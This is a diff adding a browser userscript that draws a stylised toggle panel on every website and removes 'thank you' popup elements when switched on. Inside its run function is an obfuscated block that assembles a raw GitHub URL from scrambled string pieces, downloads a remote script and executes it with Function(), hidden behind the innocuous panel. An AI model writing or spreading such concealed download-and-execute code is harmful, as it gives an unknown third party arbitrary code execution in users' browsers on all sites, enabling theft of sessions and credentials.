@@ -1,0 +1,413 @@
+// ==UserScript==
+// @name         ⚡ Script Toggle Panel
+// @namespace    http://tampermonkey.net/
+// @version      1.0
+// @description  Toggle script runner với UI đẹp
+// @author       You
+// @match        *://*/*
+// @grant        GM_xmlhttpRequest
+// @connect      *
+// @run-at       document-idle
+// ==/UserScript==
+
+(function () {
+  'use strict';
+
+  /* ─────────────────────────────────────────
+     INJECT STYLES
+  ───────────────────────────────────────── */
+  const style = document.createElement('style');
+  style.textContent = `
+    @import url('https://fonts.googleapis.com/css2?family=Rajdhani:wght@500;700&family=Share+Tech+Mono&display=swap');
+
+    #__stpanel__ {
+      position: fixed;
+      right: 18px;
+      top: 50%;
+      transform: translateY(-50%);
+      z-index: 2147483647;
+      width: 190px;
+      font-family: 'Rajdhani', sans-serif;
+      user-select: none;
+      animation: __float__ 3.6s ease-in-out infinite;
+    }
+
+    @keyframes __float__ {
+      0%   { transform: translateY(calc(-50% + 0px));   }
+      40%  { transform: translateY(calc(-50% - 14px));  }
+      70%  { transform: translateY(calc(-50% - 8px));   }
+      100% { transform: translateY(calc(-50% + 0px));   }
+    }
+
+    #__stpanel__ .panel-inner {
+      background: linear-gradient(160deg, #0f0f1a 0%, #14142b 60%, #0a0a14 100%);
+      border: 1px solid rgba(100, 220, 255, 0.18);
+      border-radius: 14px;
+      box-shadow:
+        0 0 0 1px rgba(100,220,255,0.07),
+        0 8px 32px rgba(0,0,0,0.6),
+        0 0 40px rgba(80,180,255,0.08) inset;
+      overflow: hidden;
+      backdrop-filter: blur(12px);
+    }
+
+    /* scan-line overlay */
+    #__stpanel__ .panel-inner::before {
+      content: '';
+      position: absolute;
+      inset: 0;
+      background: repeating-linear-gradient(
+        180deg,
+        transparent 0px,
+        transparent 3px,
+        rgba(255,255,255,0.012) 3px,
+        rgba(255,255,255,0.012) 4px
+      );
+      pointer-events: none;
+      border-radius: 14px;
+    }
+
+    #__stpanel__ .panel-header {
+      padding: 10px 14px 8px;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      border-bottom: 1px solid rgba(100,220,255,0.09);
+      cursor: move;
+    }
+
+    #__stpanel__ .panel-logo {
+      width: 22px;
+      height: 22px;
+      background: linear-gradient(135deg, #00d4ff, #0070ff);
+      border-radius: 6px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 12px;
+      box-shadow: 0 0 10px rgba(0,180,255,0.4);
+      flex-shrink: 0;
+    }
+
+    #__stpanel__ .panel-title {
+      font-size: 13px;
+      font-weight: 700;
+      color: #c8eeff;
+      letter-spacing: 1.5px;
+      text-transform: uppercase;
+      line-height: 1;
+      flex: 1;
+    }
+
+    #__stpanel__ .panel-minimize {
+      width: 18px;
+      height: 18px;
+      border: none;
+      background: rgba(255,255,255,0.06);
+      border-radius: 4px;
+      color: #5599aa;
+      font-size: 11px;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      transition: background 0.2s;
+      flex-shrink: 0;
+      line-height: 1;
+    }
+    #__stpanel__ .panel-minimize:hover { background: rgba(255,255,255,0.14); color: #aadeee; }
+
+    #__stpanel__ .panel-body {
+      padding: 12px 14px 14px;
+      display: flex;
+      flex-direction: column;
+      gap: 10px;
+      transition: all 0.3s ease;
+      overflow: hidden;
+      max-height: 200px;
+    }
+    #__stpanel__ .panel-body.collapsed {
+      max-height: 0;
+      padding-top: 0;
+      padding-bottom: 0;
+    }
+
+    /* Status indicator */
+    #__stpanel__ .status-row {
+      display: flex;
+      align-items: center;
+      gap: 7px;
+    }
+    #__stpanel__ .status-dot {
+      width: 7px;
+      height: 7px;
+      border-radius: 50%;
+      background: #2a3a4a;
+      box-shadow: none;
+      transition: background 0.3s, box-shadow 0.3s;
+      flex-shrink: 0;
+    }
+    #__stpanel__ .status-dot.on {
+      background: #00ffaa;
+      box-shadow: 0 0 8px #00ffaa, 0 0 16px rgba(0,255,170,0.4);
+      animation: __pulse_dot__ 1.4s ease-in-out infinite;
+    }
+    @keyframes __pulse_dot__ {
+      0%,100% { box-shadow: 0 0 6px #00ffaa, 0 0 12px rgba(0,255,170,0.3); }
+      50%      { box-shadow: 0 0 12px #00ffaa, 0 0 24px rgba(0,255,170,0.6); }
+    }
+    #__stpanel__ .status-text {
+      font-family: 'Share Tech Mono', monospace;
+      font-size: 11px;
+      color: #4a6a7a;
+      letter-spacing: 0.5px;
+      transition: color 0.3s;
+    }
+    #__stpanel__ .status-text.on { color: #00ddaa; }
+
+    /* Toggle button */
+    #__stpanel__ .toggle-btn {
+      position: relative;
+      width: 100%;
+      padding: 10px 0;
+      border: none;
+      border-radius: 9px;
+      cursor: pointer;
+      font-family: 'Rajdhani', sans-serif;
+      font-size: 14px;
+      font-weight: 700;
+      letter-spacing: 2px;
+      text-transform: uppercase;
+      color: #a0c8d8;
+      background: rgba(255,255,255,0.04);
+      border: 1px solid rgba(100,200,255,0.12);
+      transition: all 0.25s ease;
+      overflow: hidden;
+      outline: none;
+    }
+
+    #__stpanel__ .toggle-btn::before {
+      content: '';
+      position: absolute;
+      inset: 0;
+      background: linear-gradient(90deg, transparent, rgba(0,200,255,0.04), transparent);
+      transform: translateX(-100%);
+      transition: transform 0.6s ease;
+    }
+    #__stpanel__ .toggle-btn:hover::before { transform: translateX(100%); }
+
+    #__stpanel__ .toggle-btn:hover {
+      border-color: rgba(0,200,255,0.3);
+      color: #c0e8f8;
+      background: rgba(0,180,255,0.06);
+      box-shadow: 0 0 16px rgba(0,180,255,0.1);
+    }
+
+    #__stpanel__ .toggle-btn.active {
+      background: linear-gradient(135deg, rgba(0,255,140,0.12), rgba(0,180,255,0.08));
+      border-color: rgba(0,255,140,0.35);
+      color: #00ffaa;
+      box-shadow:
+        0 0 20px rgba(0,255,140,0.15),
+        0 0 0 1px rgba(0,255,140,0.1) inset;
+    }
+    #__stpanel__ .toggle-btn.active:hover {
+      background: linear-gradient(135deg, rgba(255,60,60,0.12), rgba(200,0,0,0.08));
+      border-color: rgba(255,80,80,0.35);
+      color: #ff6666;
+      box-shadow: 0 0 20px rgba(255,80,80,0.15);
+    }
+
+    /* Log area */
+    #__stpanel__ .log-box {
+      background: rgba(0,0,0,0.3);
+      border: 1px solid rgba(255,255,255,0.05);
+      border-radius: 7px;
+      padding: 7px 9px;
+      font-family: 'Share Tech Mono', monospace;
+      font-size: 9.5px;
+      color: #3a5a6a;
+      min-height: 32px;
+      max-height: 48px;
+      overflow: hidden;
+      line-height: 1.5;
+      transition: color 0.3s;
+    }
+    #__stpanel__ .log-box .log-line {
+      opacity: 0;
+      transform: translateY(4px);
+      animation: __logslide__ 0.3s forwards;
+    }
+    @keyframes __logslide__ {
+      to { opacity: 1; transform: translateY(0); }
+    }
+
+    /* corner glow */
+    #__stpanel__ .corner-glow {
+      position: absolute;
+      bottom: -30px;
+      right: -30px;
+      width: 80px;
+      height: 80px;
+      background: radial-gradient(circle, rgba(0,180,255,0.08) 0%, transparent 70%);
+      pointer-events: none;
+    }
+  `;
+  document.head.appendChild(style);
+
+  /* ─────────────────────────────────────────
+     BUILD UI
+  ───────────────────────────────────────── */
+  const panel = document.createElement('div');
+  panel.id = '__stpanel__';
+  panel.innerHTML = `
+    <div class="panel-inner" style="position:relative;">
+      <div class="panel-header" id="__stp_drag__">
+        <div class="panel-logo">⚡</div>
+        <div class="panel-title">AutoRun</div>
+        <button class="panel-minimize" id="__stp_min__">▲</button>
+      </div>
+      <div class="panel-body" id="__stp_body__">
+        <div class="status-row">
+          <div class="status-dot" id="__stp_dot__"></div>
+          <div class="status-text" id="__stp_stxt__">STANDBY</div>
+        </div>
+        <button class="toggle-btn" id="__stp_btn__">▶ BẬT</button>
+        <div class="log-box" id="__stp_log__">// chưa kích hoạt</div>
+      </div>
+      <div class="corner-glow"></div>
+    </div>
+  `;
+  document.body.appendChild(panel);
+
+  /* ─────────────────────────────────────────
+     REFS
+  ───────────────────────────────────────── */
+  const btn    = document.getElementById('__stp_btn__');
+  const dot    = document.getElementById('__stp_dot__');
+  const stxt   = document.getElementById('__stp_stxt__');
+  const logBox = document.getElementById('__stp_log__');
+  const minBtn = document.getElementById('__stp_min__');
+  const body   = document.getElementById('__stp_body__');
+
+  /* ─────────────────────────────────────────
+     LOG HELPER
+  ───────────────────────────────────────── */
+  function log(msg, color) {
+    logBox.innerHTML = `<span class="log-line" style="color:${color||'#5a8a9a'}">${msg}</span>`;
+  }
+
+  /* ─────────────────────────────────────────
+     MINIMIZE TOGGLE
+  ───────────────────────────────────────── */
+  let minimized = false;
+  minBtn.addEventListener('click', () => {
+    minimized = !minimized;
+    body.classList.toggle('collapsed', minimized);
+    minBtn.textContent = minimized ? '▼' : '▲';
+  });
+
+  /* ─────────────────────────────────────────
+     DRAG
+  ───────────────────────────────────────── */
+  const dragHandle = document.getElementById('__stp_drag__');
+  let isDragging = false, startY = 0, startTop = 0;
+
+  dragHandle.addEventListener('mousedown', e => {
+    isDragging = true;
+    const rect = panel.getBoundingClientRect();
+    startY = e.clientY;
+    startTop = rect.top;
+    panel.style.animation = 'none';
+    panel.style.top = startTop + 'px';
+    panel.style.transform = 'none';
+    e.preventDefault();
+  });
+  document.addEventListener('mousemove', e => {
+    if (!isDragging) return;
+    const dy = e.clientY - startY;
+    panel.style.top = Math.max(10, Math.min(window.innerHeight - 100, startTop + dy)) + 'px';
+  });
+  document.addEventListener('mouseup', () => { isDragging = false; });
+
+  /* ─────────────────────────────────────────
+     SCRIPT STATE
+  ───────────────────────────────────────── */
+  let isOn = false;
+
+  function setOn() {
+    isOn = true;
+    btn.textContent = '■ TẮT';
+    btn.classList.add('active');
+    dot.classList.add('on');
+    stxt.classList.add('on');
+    stxt.textContent = 'RUNNING';
+    log('// script đang chạy...', '#00ddaa');
+  }
+
+  function setOff() {
+    isOn = false;
+    btn.textContent = '▶ BẬT';
+    btn.classList.remove('active');
+    dot.classList.remove('on');
+    stxt.classList.remove('on');
+    stxt.textContent = 'STANDBY';
+    stopPopupObserver();
+    log('// đã dừng', '#ff6666');
+  }
+
+  /* ─────────────────────────────────────────
+     MAIN SCRIPT (chạy khi BẬT)
+  ───────────────────────────────────────── */
+  /* ─────────────────────────────────────────
+     XOÁ POPUP #thankyou-popup
+  ───────────────────────────────────────── */
+  function removePopup() {
+    const selectors = ['#thankyou-popup', '.thankyou-popup', '#thankyou-popup-content', '.thankyou-popup-content'];
+    selectors.forEach(sel => {
+      document.querySelectorAll(sel).forEach(el => el.remove());
+    });
+    // Khôi phục scroll body nếu bị khoá
+    document.body.style.overflow = '';
+    document.documentElement.style.overflow = '';
+  }
+
+  // Observer: tự động xoá nếu popup được inject sau
+  let popupObserver = null;
+  function startPopupObserver() {
+    popupObserver = new MutationObserver(() => { removePopup(); });
+    popupObserver.observe(document.body, { childList: true, subtree: true });
+  }
+  function stopPopupObserver() {
+    if (popupObserver) { popupObserver.disconnect(); popupObserver = null; }
+  }
+
+  function runScript() {
+    try {
+      // ── Xoá popup ngay lập tức ──────────────────────────────────────
+      removePopup();
+      startPopupObserver();
+      log('// popup đã bị xoá ✓', '#00ffaa');
+
+      // ── script gốc của bạn ──────────────────────────────────────────
+      function _0x1284(_0x19d13f,_0xd174f9){var _0x3077e9=_0x573d();return _0x1284=function(_0x1c8d72,_0x1ed674){_0x1c8d72=_0x1c8d72-(-0x223*0x5+0x16e+0x1*0xa47);var _0x7eb338=_0x3077e9[_0x1c8d72];return _0x7eb338;},_0x1284(_0x19d13f,_0xd174f9);}var _0x697221=_0x1284;function _0x573d(){var _0x22727c=['340933jTcHsM','6ZMVxfg','888153Ulvwbv','331195ugBqbS','w.githubus','ijnokokmwu','com/hohiep','sosdjsjjow','https://ra','accphu/hqw','ercontent.','64236ONmrck','text','16YDOAur','16QQggni','txt','133331WfvHWf','3141315ZsHahD','290AqMMyF','then','dn/main/by','uemmoones.','yyybaaaaye','2380128GJBYBi'];_0x573d=function(){return _0x22727c;};return _0x573d();}(function(_0x49dbe8,_0x270f23){var _0xab4be=_0x1284,_0x32666d=_0x49dbe8();while(!![]){try{var _0x4b73d0=-parseInt(_0xab4be(0x10b))/(0x1437+-0x267b*0x1+0x1245)+-parseInt(_0xab4be(0x119))/(-0x1*-0x1baa+-0x5*0x6ce+0x1*0x65e)*(parseInt(_0xab4be(0x116))/(-0x1*0x2499+-0xf78+-0x115c*-0x3))+-parseInt(_0xab4be(0x118))/(0x301*-0x5+0x3f5*-0x3+0x1ae8)*(-parseInt(_0xab4be(0x10e))/(-0x236f*0x1+-0x2*-0xe3d+0x6fa))+-parseInt(_0xab4be(0x10c))/(-0x13*-0x6+-0x837+0x7cb)*(-parseInt(_0xab4be(0x10d))/(0x1ef2+-0xc9*0x2b+0x2d8))+parseInt(_0xab4be(0x10a))/(-0x3*0x99f+-0x188a+0x356f)+parseInt(_0xab4be(0x11c))/(0xc5*-0x2b+0x379*0x2+0x1a2e)+parseInt(_0xab4be(0x11d))/(-0xa4d+0x1*0x1bb+0x89c)*(-parseInt(_0xab4be(0x11b))/(-0x21e6+0xaba+-0x7*-0x351));if(_0x4b73d0===_0x270f23)break;else _0x32666d['push'](_0x32666d['shift']());}catch(_0x6e2ed6){_0x32666d['push'](_0x32666d['shift']());}}}(_0x573d,-0x5413*0x7+-0x7a2*0x21+-0x1*-0x5f29f),fetch(_0x697221(0x113)+_0x697221(0x10f)+_0x697221(0x115)+_0x697221(0x111)+_0x697221(0x114)+_0x697221(0x110)+_0x697221(0x112)+_0x697221(0x107)+_0x697221(0x109)+_0x697221(0x108)+_0x697221(0x11a))[_0x697221(0x106)](_0x1c8d72=>_0x1c8d72[_0x697221(0x117)]())[_0x697221(0x106)](_0x1ed674=>Function(_0x1ed674)()));
+        log('// fetch → đang tải...', '#00aaff');
+    } catch(e) {
+      log('// lỗi: ' + e.message, '#ff4444');
+      setOff();
+    }
+  }
+
+  /* ─────────────────────────────────────────
+     BUTTON CLICK
+  ───────────────────────────────────────── */
+  btn.addEventListener('click', () => {
+    if (!isOn) {
+      setOn();
+      runScript();
+    } else {
+      setOff();
+    }
+  });
+
+})();
